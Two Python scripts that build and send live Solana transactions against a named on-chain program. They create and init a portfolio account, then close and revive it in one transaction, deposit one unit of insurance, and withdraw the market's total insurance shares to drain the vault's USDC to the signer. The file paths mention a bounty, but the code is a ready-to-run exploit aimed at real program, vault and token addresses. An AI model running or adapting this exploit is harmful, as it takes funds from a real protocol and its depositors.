# === claim.py (create+init+TX1+TX2, single script) ===

import os, json, base64, struct, time, sys, urllib.request
from solders.pubkey import Pubkey
from solders.keypair import Keypair
from solders.instruction import Instruction, AccountMeta
from solders.hash import Hash
from solders.message import MessageV0
from solders.transaction import VersionedTransaction
from solders.system_program import create_account, CreateAccountParams, transfer, TransferParams

RPC = os.environ["HELIUS_RPC"]
def rpc(method, params):
    body = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    last=None
    for attempt in range(6):
        try:
            req = urllib.request.Request(RPC, data=body, headers={"content-type":"application/json"})
            with urllib.request.urlopen(req, timeout=40) as r:
                return json.loads(r.read())
        except Exception as e:
            last=e; time.sleep(1.5*(attempt+1))
    raise last

CORE  = Pubkey.from_string("GVV4HCAohuWDTXRHUYLpFECvTUhCUF2qys36vQKtYJsm")
DEX   = Pubkey.from_string("6nxbqVQREBwW2ESc1sJyPaUH9yZ7MgKE53fQh3Fm1CkH")
MKT   = Pubkey.from_string("76oGDQbQW3MEteg2uQqf31PyTmFZp8ujZTyGu3kfFSwq")
MINT  = Pubkey.from_string("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")
ATA   = Pubkey.from_string("HByjjeyLRz35x5PvJ9WpPe37dtpHCHLCDnvdLWsMXtQF")
TOKP  = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
VAULT, _ = Pubkey.find_program_address([b"dvlt", bytes(DEX)], CORE)

kp_bytes = bytes(json.load(open("/home/box/.secrets/toly-bounty-claimer.json")))
SIGNER = Keypair.from_bytes(kp_bytes)
assert str(SIGNER.pubkey()) == "J82YD5pPBcBqJThYif1DaCH2vLyU22RbWQDRLtz3v4DB", "signer mismatch"
print("signer:", SIGNER.pubkey(), " vault(derived):", VAULT)

def ix_init_portfolio(pfl):
    return Instruction(CORE, bytes([5]),
        [AccountMeta(DEX,False,True),AccountMeta(pfl,False,True),AccountMeta(SIGNER.pubkey(),True,False)])
def ix_close(acc):
    return Instruction(CORE, bytes([19]),
        [AccountMeta(acc,False,True),AccountMeta(SIGNER.pubkey(),True,False),AccountMeta(SIGNER.pubkey(),False,True)])
def ix_deposit_ins(receipt, amount, donate=0):
    data = bytes([8]) + struct.pack("<Q",amount) + bytes([donate])
    return Instruction(CORE, data,
        [AccountMeta(DEX,False,True),AccountMeta(MKT,False,True),AccountMeta(receipt,False,True),
         AccountMeta(SIGNER.pubkey(),True,False),AccountMeta(ATA,False,True),AccountMeta(MINT,False,False),
         AccountMeta(VAULT,False,True),AccountMeta(TOKP,False,False)])
def ix_withdraw_ins(receipt, burn):
    data = bytes([9]) + struct.pack("<Q",burn)
    return Instruction(CORE, data,
        [AccountMeta(DEX,False,True),AccountMeta(MKT,False,True),AccountMeta(receipt,False,True),
         AccountMeta(SIGNER.pubkey(),True,False),AccountMeta(ATA,False,True),AccountMeta(MINT,False,False),
         AccountMeta(VAULT,False,True),AccountMeta(TOKP,False,False)])

def blockhash():
    return Hash.from_string(rpc("getLatestBlockhash",[{"commitment":"finalized"}])["result"]["value"]["blockhash"])
def min_rent(size):
    return rpc("getMinimumBalanceForRentExemption",[size])["result"]
def get_acct(pk):
    v = rpc("getAccountInfo",[str(pk),{"encoding":"base64"}])["result"]["value"]
    if not v: return None
    return {"data":base64.b64decode(v["data"][0]),"owner":v["owner"],"lamports":v["lamports"]}
def u64(d,o): return struct.unpack_from("<Q",d,o)[0]
def u32(d,o): return struct.unpack_from("<I",d,o)[0]
def tok_bal(pk):
    r=rpc("getTokenAccountBalance",[str(pk)])["result"]["value"]; return int(r["amount"])
def mkt_state():
    d=get_acct(MKT)["data"]
    return {"ins":u64(d,224),"totSh":u64(d,248),"oiL":u64(d,256),"oiS":u64(d,264)}

def build(ixs, signers):
    msg = MessageV0.try_compile(SIGNER.pubkey(), ixs, [], blockhash())
    return VersionedTransaction(msg, signers)
def simulate(tx, label):
    b64 = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction",[b64,{"sigVerify":False,"replaceRecentBlockhash":True,"encoding":"base64","commitment":"processed"}])
    val = r.get("result",{}).get("value") if "result" in r else None
    if val is None:
        print(f"  [{label}] SIM RPC ERROR:", json.dumps(r)[:500]); return False, r
    err = val.get("err")
    print(f"  [{label}] sim err={err} units={val.get('unitsConsumed')}")
    if err is not None:
        print("    logs:", "\n    ".join(val.get("logs") or [])); return False, val
    return True, val
def send(tx, label):
    b64 = base64.b64encode(bytes(tx)).decode()
    r = rpc("sendTransaction",[b64,{"encoding":"base64","skipPreflight":False,"preflightCommitment":"processed","maxRetries":5}])
    if "error" in r:
        print(f"  [{label}] SEND ERROR:", json.dumps(r["error"])[:600]); return None
    sig = r["result"]; print(f"  [{label}] sent: {sig}")
    for _ in range(40):
        time.sleep(2)
        st = rpc("getSignatureStatuses",[[sig]])["result"]["value"][0]
        if st and st.get("confirmationStatus") in ("confirmed","finalized"):
            if st.get("err"): print(f"  [{label}] CONFIRMED WITH ERR:", st["err"]); return None
            print(f"  [{label}] {st['confirmationStatus']}"); return sig
    print(f"  [{label}] NOT confirmed in time"); return None

GO = "--go" in sys.argv
print("MODE:", "LIVE SEND" if GO else "SIMULATE-ONLY")
print("pre: market", mkt_state(), "vault USDC", tok_bal(VAULT), "signer USDC", tok_bal(ATA), "signer SOL", get_acct(SIGNER.pubkey())["lamports"])

# ---- PHASE A: create + init portfolio ----
P = Keypair()
rent = min_rent(952)
print(f"\nPHASE A: create portfolio P={P.pubkey()} rent={rent}")
ca = create_account(CreateAccountParams(from_pubkey=SIGNER.pubkey(),to_pubkey=P.pubkey(),lamports=rent,space=952,owner=CORE))
txA = build([ca, ix_init_portfolio(P.pubkey())], [SIGNER, P])
okA,_ = simulate(txA, "A")
if not okA: print("ABORT at A"); sys.exit(1)
if not GO: print("(simulate-only; stopping before send)"); sys.exit(0)
sigA = send(txA, "A")
if not sigA: print("ABORT at A send"); sys.exit(1)
pa = get_acct(P.pubkey())
print(f"  P after init: magic=0x{u32(pa['data'],0):08x} owner_field={base64.b16encode(pa['data'][56:88]).decode()} off80={u64(pa['data'],80)} lamports={pa['lamports']}")
json.dump({"P":str(P.pubkey()),"sigA":sigA,"P_secret_present":True}, open("/workspace/toly-bounty/claim/state.json","w"))

# ---- PHASE B: close + topup + deposit(1) ----
print("\nPHASE B: close + topup + depositInsurance(1)")
ixs=[ix_close(P.pubkey()), transfer(TransferParams(from_pubkey=SIGNER.pubkey(),to_pubkey=P.pubkey(),lamports=rent)), ix_deposit_ins(P.pubkey(),1,0)]
txB = build(ixs, [SIGNER])
okB,_ = simulate(txB,"B")
if not okB: print("ABORT at B"); sys.exit(1)
sigB = send(txB,"B")
if not sigB: print("ABORT at B send"); sys.exit(1)
pb = get_acct(P.pubkey()); ms=mkt_state()
print(f"  P revived: magic=0x{u32(pb['data'],0):08x} shares@80={u64(pb['data'],80)}  market now {ms}")

# ---- PHASE C: withdraw(burn=totalInsShares) ----
burn = ms["totSh"]
print(f"\nPHASE C: withdrawInsurance(burn={burn})")
usdc_before = tok_bal(ATA); vault_before = tok_bal(VAULT)
txC = build([ix_withdraw_ins(P.pubkey(), burn)], [SIGNER])
okC,valC = simulate(txC,"C")
if not okC: print("ABORT at C"); sys.exit(1)
sigC = send(txC,"C")
if not sigC: print("ABORT at C send"); sys.exit(1)
usdc_after = tok_bal(ATA); vault_after = tok_bal(VAULT); ms2=mkt_state()
print(f"\n=== RESULT ===")
print(f"  signer USDC: {usdc_before} -> {usdc_after}  (delta {usdc_after-usdc_before})")
print(f"  vault USDC : {vault_before} -> {vault_after}")
print(f"  market: {ms2}")
print(f"  sigs: A={sigA} B={sigB} C={sigC}")
json.dump({"P":str(P.pubkey()),"sigA":sigA,"sigB":sigB,"sigC":sigC,
           "usdc_before":usdc_before,"usdc_after":usdc_after,"vault_before":vault_before,"vault_after":vault_after,
           "market_after":ms2}, open("/workspace/toly-bounty/claim/state.json","w"))
print("DONE")


# === claim_bc.py (reuse existing portfolio; TX1+TX2 with distinct close sink) ===

import os, json, base64, struct, time, sys, urllib.request
from solders.pubkey import Pubkey
from solders.keypair import Keypair
from solders.instruction import Instruction, AccountMeta
from solders.hash import Hash
from solders.message import MessageV0
from solders.transaction import VersionedTransaction
from solders.system_program import transfer, TransferParams

RPC = os.environ["HELIUS_RPC"]
def rpc(method, params):
    body = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    last=None
    for a in range(6):
        try:
            req=urllib.request.Request(RPC,data=body,headers={"content-type":"application/json"})
            with urllib.request.urlopen(req,timeout=40) as r: return json.loads(r.read())
        except Exception as e: last=e; time.sleep(1.5*(a+1))
    raise last

CORE=Pubkey.from_string("GVV4HCAohuWDTXRHUYLpFECvTUhCUF2qys36vQKtYJsm")
DEX =Pubkey.from_string("6nxbqVQREBwW2ESc1sJyPaUH9yZ7MgKE53fQh3Fm1CkH")
MKT =Pubkey.from_string("76oGDQbQW3MEteg2uQqf31PyTmFZp8ujZTyGu3kfFSwq")
MINT=Pubkey.from_string("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")
ATA =Pubkey.from_string("HByjjeyLRz35x5PvJ9WpPe37dtpHCHLCDnvdLWsMXtQF")
TOKP=Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
VAULT,_=Pubkey.find_program_address([b"dvlt",bytes(DEX)],CORE)
P=Pubkey.from_string("5atDktvTRPJuy92dYMUFXHdPP6kURLCmG2VQHSGV9wQw")
SIGNER=Keypair.from_bytes(bytes(json.load(open("/home/box/.secrets/toly-bounty-claimer.json"))))
S=Keypair()  # distinct lamport sink for close dest

def ix_close(acc,dest):
    return Instruction(CORE,bytes([19]),[AccountMeta(acc,False,True),AccountMeta(SIGNER.pubkey(),True,False),AccountMeta(dest,False,True)])
def ix_deposit_ins(receipt,amount,donate=0):
    return Instruction(CORE,bytes([8])+struct.pack("<Q",amount)+bytes([donate]),
        [AccountMeta(DEX,False,True),AccountMeta(MKT,False,True),AccountMeta(receipt,False,True),AccountMeta(SIGNER.pubkey(),True,False),
         AccountMeta(ATA,False,True),AccountMeta(MINT,False,False),AccountMeta(VAULT,False,True),AccountMeta(TOKP,False,False)])
def ix_withdraw_ins(receipt,burn):
    return Instruction(CORE,bytes([9])+struct.pack("<Q",burn),
        [AccountMeta(DEX,False,True),AccountMeta(MKT,False,True),AccountMeta(receipt,False,True),AccountMeta(SIGNER.pubkey(),True,False),
         AccountMeta(ATA,False,True),AccountMeta(MINT,False,False),AccountMeta(VAULT,False,True),AccountMeta(TOKP,False,False)])

def blockhash(): return Hash.from_string(rpc("getLatestBlockhash",[{"commitment":"finalized"}])["result"]["value"]["blockhash"])
def min_rent(sz): return rpc("getMinimumBalanceForRentExemption",[sz])["result"]
def get_acct(pk):
    v=rpc("getAccountInfo",[str(pk),{"encoding":"base64"}])["result"]["value"]
    return None if not v else {"data":base64.b64decode(v["data"][0]),"owner":v["owner"],"lamports":v["lamports"]}
def u64(d,o): return struct.unpack_from("<Q",d,o)[0]
def u32(d,o): return struct.unpack_from("<I",d,o)[0]
def tok_bal(pk): return int(rpc("getTokenAccountBalance",[str(pk)])["result"]["value"]["amount"])
def mkt_state():
    d=get_acct(MKT)["data"]; return {"ins":u64(d,224),"totSh":u64(d,248),"oiL":u64(d,256),"oiS":u64(d,264)}
def build(ixs,signers): return VersionedTransaction(MessageV0.try_compile(SIGNER.pubkey(),ixs,[],blockhash()),signers)
def simulate(tx,label):
    r=rpc("simulateTransaction",[base64.b64encode(bytes(tx)).decode(),{"sigVerify":False,"replaceRecentBlockhash":True,"encoding":"base64","commitment":"processed"}])
    val=r.get("result",{}).get("value")
    if val is None: print(f"  [{label}] SIM RPC ERR:",json.dumps(r)[:400]); return False
    print(f"  [{label}] sim err={val.get('err')} units={val.get('unitsConsumed')}")
    if val.get("err") is not None: print("    logs:","\n    ".join(val.get("logs") or [])); return False
    return True
def send(tx,label):
    r=rpc("sendTransaction",[base64.b64encode(bytes(tx)).decode(),{"encoding":"base64","skipPreflight":False,"preflightCommitment":"processed","maxRetries":5}])
    if "error" in r: print(f"  [{label}] SEND ERR:",json.dumps(r["error"])[:600]); return None
    sig=r["result"]; print(f"  [{label}] sent: {sig}")
    for _ in range(45):
        time.sleep(2); st=rpc("getSignatureStatuses",[[sig]])["result"]["value"][0]
        if st and st.get("confirmationStatus") in ("confirmed","finalized"):
            if st.get("err"): print(f"  [{label}] CONFIRMED-ERR:",st["err"]); return None
            print(f"  [{label}] {st['confirmationStatus']}"); return sig
    print(f"  [{label}] not confirmed"); return None

GO="--go" in sys.argv
pa=get_acct(P)
print("P check: magic=0x%08x off80=%d owner_match=%s lamports=%d"%(u32(pa['data'],0),u64(pa['data'],80),base64.b16encode(pa['data'][56:88]).decode()==str(base64.b16encode(bytes(SIGNER.pubkey()))) ,pa['lamports']))
print("pre: market",mkt_state(),"vault",tok_bal(VAULT),"signer USDC",tok_bal(ATA))
rent=min_rent(952)
print("MODE:", "LIVE" if GO else "SIM-ONLY", "sink S=",S.pubkey())

# TX1: fund sink -> close P (dest=S) -> topup P -> depositInsurance(1)
tx1=build([transfer(TransferParams(from_pubkey=SIGNER.pubkey(),to_pubkey=S.pubkey(),lamports=2_000_000)),
           ix_close(P,S.pubkey()),
           transfer(TransferParams(from_pubkey=SIGNER.pubkey(),to_pubkey=P,lamports=rent)),
           ix_deposit_ins(P,1,0)],[SIGNER])
if not simulate(tx1,"TX1"): print("ABORT TX1"); sys.exit(1)
if not GO: print("(sim-only stop)"); sys.exit(0)
sig1=send(tx1,"TX1")
if not sig1: print("ABORT TX1 send"); sys.exit(1)
pb=get_acct(P); ms=mkt_state()
print("  revived P: magic=0x%08x shares@80=%d  market=%s"%(u32(pb['data'],0),u64(pb['data'],80),ms))

# TX2: withdraw whole pot
burn=ms["totSh"]; ub=tok_bal(ATA); vb=tok_bal(VAULT)
tx2=build([ix_withdraw_ins(P,burn)],[SIGNER])
if not simulate(tx2,"TX2"): print("ABORT TX2"); sys.exit(1)
sig2=send(tx2,"TX2")
if not sig2: print("ABORT TX2 send"); sys.exit(1)
ua=tok_bal(ATA); va=tok_bal(VAULT); ms2=mkt_state()
print("\n=== RESULT ===")
print("  signer USDC: %d -> %d (delta %+d = %+.6f USDC)"%(ub,ua,ua-ub,(ua-ub)/1e6))
print("  vault USDC : %d -> %d"%(vb,va))
print("  market after:",ms2)
print("  sigs: A=2uv9iiQxS9Vt8nSvAqvxXke2jrZBMSy8J9vrZcXy4tcY2dWmXUe6KqEk4snkJuA9UmEE8tkB4WcgvV9nNEyhS9Wt TX1=%s TX2=%s"%(sig1,sig2))
json.dump({"P":str(P),"sigA":"2uv9iiQxS9Vt8nSvAqvxXke2jrZBMSy8J9vrZcXy4tcY2dWmXUe6KqEk4snkJuA9UmEE8tkB4WcgvV9nNEyhS9Wt","sig_tx1":sig1,"sig_tx2":sig2,"usdc_before":ub,"usdc_after":ua,"vault_before":vb,"vault_after":va,"market_after":ms2},open("claim/state.json","w"))
print("DONE")
